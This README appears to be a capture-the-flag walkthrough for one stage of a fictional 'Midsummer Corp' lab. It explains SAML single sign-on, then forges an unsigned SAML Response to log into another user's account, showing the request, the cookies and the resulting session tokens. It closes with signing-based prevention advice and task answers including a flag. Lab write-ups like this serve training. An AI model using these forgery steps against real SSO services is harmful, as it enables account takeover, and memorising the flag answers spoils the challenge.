[[ 🡅 Move up ]](../)</br>
[[ 🡄 Previous ]](../04_Boruta/) **05: Twardowski** [[ Next 🡆 ]](../06_Popiel/)

# ☆ Twardowski, the Alchemist ☆

> Twardowski is a master of alchemy and uses his knowledge to create potions and elixirs that aid in the search for the fern flower. He is constantly experimenting with different ingredients and formulas to unlock the secrets of the flower's power. Twardowski's work is crucial to the company's mission, as his potions can provide the team with enhanced strength, speed, and intelligence.

## Exploitation

### Briefing

> Twardowski is brilliant but also a little bit eccentric man. What can you expect from a guy interested in alchemy and mysticism? He was hired by Midsummer Corp also because of his deep knowledge and expertise in IT. Especially when it comes to providing single sign-on experience with SAML. You see? A true renaissance man. He was given the task of implementing Single Sign-On in Midsummer Corp's application. Unfortunately, he disappeared under mysterious circumstances. Before he vanished, he managed to send a short message to Boruta explaining what had to be done in order to finish SSO implementation. But what actually is SAML and how is this whole thing supposed to work? 
>
> **What is SAML?** </br>
> SAML (Security Assertion Markup Language) is a standard protocol used for exchanging authentication and authorization data between usually three parties: a user, an identity provider (IdP) and a service provider (SP). It may be one of the answers to the question "How can I let users log in once and access multiple applications without having to enter their credentials each time?". Let's say you want to access a cloud-based application. You visit its home page, go to login form and select the option to sign in with an identity provider. After this, the application forwards you to an IdP where you have to provide your credentials. IdP authenticates you and creates an SAML assertion (a document containing information about you, like first name, last name, email, etc.). This assertion is digitally signed by the IdP to ensure its integrity and sent back to your application. Now the application, as a service provider, validates the signature, retrieves information contained in the assertion, and grants you access to the application. 
>
> Unfortunately, you will not be able to go through the whole flow like this with the Midsummer Corp app. Twardowski managed to configure SSO in Midsummer app, but broke IdP before he vanished. Still, you need to access his account which can be done only through SSO. Do you have an idea how to achieve this? Boruta was supposed to clean Twardowski's mess, so maybe he will know something? 
>
> **Useful resources** </br>
> - [SAML - what can go wrong? Security check](https://www.securing.pl/en/saml-what-can-go-wrong-security-check/)
> - [SAML Security - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html)

**Prerequisites**: Access to `boruta` account. </br>
**Your objective**: Find a way to log in to the `twardowski` account.

### Reconnaissance

> **Note** </br>
I won't be explain how SAML and SSO work in detail but it's crucial to have knowledge about them in order to understand this attack. I refer you to [this article by SecuRing](https://www.securing.pl/en/saml-what-can-go-wrong-security-check/) in order to better understand the flow and logic behind SAML SSO.

Let's start by exploring Boruta's files. There are two that should immediately grab out attention - [`twardowski_sso_config.msg.txt`](./twardowski_sso_config.msg.txt) and [`twardowski_sso_mess_msg.txt`](./twardowski_sso_mess_msg.txt). While the latter simply refers to Identity Provider (IdP for short) and by extension SSO being down, the former actually gives us some useful information that we will need.

Just by reading the files we can quickly deduce, how the attack is supposed to happen - although the IdP is down and can't generate a valid response, we can fabricate it to convince the Service Provider (SP), AKA our web application, that we are in fact a certain user.

We can easily confirm that the we won't be able to access the IdP by navigating to the login page and selecting `Login with SSO and SAML` option. Although the request failed, it's worth taking a look at the payload of this GET request:

```HTTP
SAMLRequest: jZJdT8IwFIbvTfwPZvds7caHa4AEwQ8SBALohTekbmfSZGtrT+fHv7cbU9FEYtOrc87znvdt2kde5JqNSruTK3guAe3pyZk7b0UukdXdgVcayRRHgUzyApDZhK1HtzMW+oRpo6xKVO795o5jHBGMFUo23HQy8Bbzy9niejrfZnGcUgLtdrcdx1EGnTjspiQmQLOM0yjrUZpEEc0a9h4MOqWB54RdqRFELGEq0XJpXYeEUYt0W2FnQ0MW9li7+9DQE5dZSG5rhZ21mgWBSLVfiBTLogDjJ8po1iGEBFWuBls2uS+ETIV8Op72cT+E7GazWbaWi/WmURl9PsNYSbcNzBrMi0jgbjX7MkOJX91z6sdxwLXGoHTQtvJSGwp4gt5wr9evCqzObob/5QuwPOWW94ND+kBQs7mLNJ0sVS6S932jOlfKFNz+HZ36tK6ItJXVo6yUqCERmYDU+9YZ5bl6HRvgFgaeNSV4Z4Hbv/fz83cOPwA=
RelayState: http://10.10.181.99/apps/user_saml/saml/login
```

`RelayState` is a parameter that indicated what resource the user will try to access after a successful sign in; think of it as redirect after we are done with SSO.

`SAMLRequest` on the other hand is the data we are sending to the IdP. Using [SAML Decoder](https://developer.pingidentity.com/en/tools/saml-decoder.html) we can decipher this gibberish into a readable text:

```XML
<samlp:AuthnRequest
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="ONELOGIN_f99d10e4464993fe5926d090e1ffa13f711c331f"
    Version="2.0"
    IssueInstant="2023-06-25T12:27:46Z"
    Destination="http://idp.midsummer.corp:5000/saml"
    ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
    AssertionConsumerServiceURL="http://10.10.181.99/apps/user_saml/saml/acs">
    <saml:Issuer>http://10.10.181.99/apps/user_saml/saml/metadata</saml:Issuer>
    <samlp:NameIDPolicy
        Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified"
        AllowCreate="true" />
</samlp:AuthnRequest>
```

`Issuer` field seems worth looking at, and by navigating to this URI we are presented with [`metadata.xml`](./metadata.xml) file.

```XML
<!-- showing only fragment of the file -->

<md:SPSSODescriptor
    AuthnRequestsSigned="false"
    WantAssertionsSigned="false"
    protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"
>
    <md:AssertionConsumerService
            Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
            Location="http://10.10.181.99/apps/user_saml/saml/acs"
            index="1"
    />
</md:SPSSODescriptor>
```

`AuthnRequestsSigned="false"` and `WantAssertionsSigned="false"` reasure us that we will have to deal with unsigned SAML type, the easiest one to exploit.

We also get a useful piece of information from `Location` attribute - that's the URI of our SP!

Reading through the [`twardowski_sso_config.msg.txt`](./twardowski_sso_config.msg.txt) file again, we can gather few more details:
- Identity Provider (IdP) URI is `http://idp.midsummer.corp`
- Service Provider (SP) URI is `/apps/user_saml/saml/acs`, further confirming that the full URI is `http://MACHINE_IP/apps/user_saml/saml/acs`
- We will need to provide an `alias` field in our claim matching the username and a `role` field, matching `sso`. Since Twardowski said that only theirs account is in the `sso` group, `alias` has to be `twardowski`.
- We need to provide a special cookie, `saml_data`, with given value

It's also high time to find a template for crafting our SAML Response. We can use [SAML Response Examples by samltool.com](https://www.samltool.com/generic_sso_res.php) to quickly find what we are looking for. Since we know the response is unsigned, we will pick the first entry, named `SAML Response`.

Will all of the information we need, it's time to execute the attack!

### Attack Vector

Usage of unsigned SAML for SSO purposes

### Execution

Using the template we can replace placeholder fields and attributes with the correct ones, namely:
- changing two occurances of `<saml:Issuer>` value to `http://idp.midsummer.corp`
- changing `Destination` attribute of `<saml:Response>` to `http://MACHINE_IP/apps/user_saml/saml/acs`
- changing all occurances of `http://sp.example.com/demo1/metadata.php` to `http://MACHINE_IP/apps/user_saml/saml/metadata`
- changing contents of `<saml:AttributeStatement>` to include two attributes we need, `alias` and `role`

I have provided copies of the [template used](./SAMLResponse_template.xml) as well as [fully crafted SAML Response](./SAMLResponse_crafted.xml) in case you want to have a look.

To send the SAMLResponse, we need to first encode it using base64 - I used [base64encode.org](https://www.base64encode.org/) for that.

Using Postman, we are finally ready to send the SAML Response:

<details>
<summary>View HTTP Request</summary>

```HTTP
POST /apps/user_saml/saml/acs HTTP/1.1
Host: 10.10.181.99
Content-Type: application/x-www-form-urlencoded
Cookie: saml_data=Nzk2MDRiOTg0YmIxYzg3N2JiOGZkMjc3YzczMWEwNWM4OGVlNjdmNDBmMDY0N2ZmNTEwYjdmYmM3ZjQwOTkyYmY0NTQ5OGZmOTMyOTU0NTVkNTQ2MDcwOTQxYTg4NmEwNzlhM2VlYzZjODU5OTI1MGQ5Zjg2MDQ1ZTZlYzdmYWY2YzNmYjMwN2E2Yzg0MWNiN2QwYzY4NDVmNThjN2QwOTdlMGRlOTQyNDRkOGEzMzMwYmYwNmEyOGVhZGRjNDdhMmQyNzQ0NzRiY2M3MGU4YTc2ZGU0ZTdkOGY3M2RmOWF8Mjc2ODNmMTE0NTVjOTgzOTNmZWZmNGM3ODMwOGU4OTl8NmNlZTUyOTRmMmU4MzRjMTZlOGQwNjk0Yjk2MjU0N2E2ODhmNDhkM2UxYTFmYWY3YjkyNWExZjhiOGEyZTQ4NGJjNmYyYjk4MThmOWU2YTY2ZTgzMzViZGRiMmU3MzQxNjEwMzk3NmM5YjAxNzkxYjk5MjgzMThiMzI2ZjJkMzR8Mw%3D%3D
Content-Length: 3317

SAMLResponse=[REDACTED]
```
</details>

Looking at the response headers, we can clearly see we are logged in, hurray!

```HTTP
oc_sessionPassphrase=bd2hdt4PGYZkpAswtKvj5pCz%2BkOg%2B1v5wdM1ihj%2BBJJLbVaXXpo1npM3iRsUpKVEl03XAhUACW33HNi%2Fc7jPSFMST1v4U6JPJ%2B5mxHNKfkHLrlzxa7OcdayJtISkPVry
ocuzsvwf431x=2955a9b68cd801a7c8900c00cd1c7067
nc_username=twardowski
nc_token=wa3WsSgCAucx82lltdkl2dOhGtbPIFeL
nc_session_id=2955a9b68cd801a7c8900c00cd1c7067
```

The only thing to do is to copy those cookies into the browser, to make it easier for us to access the account and files stored on it.

> **Note** </br>
Alternatively, we can use a browser extension called [Postman Interceptor](https://learning.postman.com/docs/sending-requests/capturing-request-data/interceptor/) to allow us to synchronize cookies between the Postman desktop app and the web browser.

## Prevention

When implementing a system which uses **claims** to verify the identity of the user it is important to, at minimum, use some kind of signing mechanism.

Signing is a process in which the claims inside are fed into an encryption algorithm to generate a unique signature, which is included somewhere in the data being sent. Since the signature is tied to the claims inside, to preserve the integrity of the data you are **required to update the signature** with every claim change.

So, a user with malicious intent **won't be able to modify the claims** without knowing the secret they were signed with. Even if they try, **server can easily verify** that claimes had been tampered with, as the signature in the data is not matching the claims anymore.

You can also choose to **encrypt the data**, providing it with another layer of security. While unencrypted claims are easily readable (but not easily modifiable if used in conjunction with signing), **encrypted claims are not readable by end-user**. Server can still decrypt and access them hovewer, since it holds the secret used for encryption.

When choosing an encryption algorithm, it is advised to use an **assymetric** one, due to intrinsic higher security this class provides.

## Tasks

### What is the name of the XML entity that contains information about user such as their name, email, roles, etc.?

`Assertion`

Straight from the Briefing.

### What is the name of a party that authenticates users and issues SAML assertions?

`Identity Provider`

Straight from the Briefing.

### What is the date on the document scan from Twardowski's account in DD/MM/YYYY format?

`15/06/2023`

Found in [`pact_with_devil_scan.jpg`](./pact_with_devil_scan.jpg) in the account's files.

### What should be the value of Content-Type header when sending the SAML Response?

`application/x-www-form-urlencoded`

Can be easily googled or found in a SAML flow example.

### What should be Destination set to in SAML Response?

`http://files.midsummer.corp.local/apps/user_saml/saml/acs`

The `/apps/user_saml/saml/acs` was discovered in [`twardowski_sso_config.msg.txt`](./twardowski_sso_config.msg.txt) file and combining it with Base URL (on which we stumbled upon in [Stage 01](../01_Puck/README.md)) gives us the desired result.

### What should be Issuer set to in SAML Response?

`http://idp.midsummer.corp`

Found in [`twardowski_sso_config.msg.txt`](./twardowski_sso_config.msg.txt) file (`idp` part in the URI gives it away).

### What is the content of the Fern_flower_ritual_shard5.txt file in Twardowski's account?

`Midsummer_Corp{Look_f0r_th3_fern_w1th_silv3r_l3av3s}`

Found in the account's files.

</br>
</br>
</br>

[[ 🡅 Move up ]](../)</br>
[[ 🡄 Previous ]](../04_Boruta/) **05: Twardowski** [[ Next 🡆 ]](../06_Popiel/)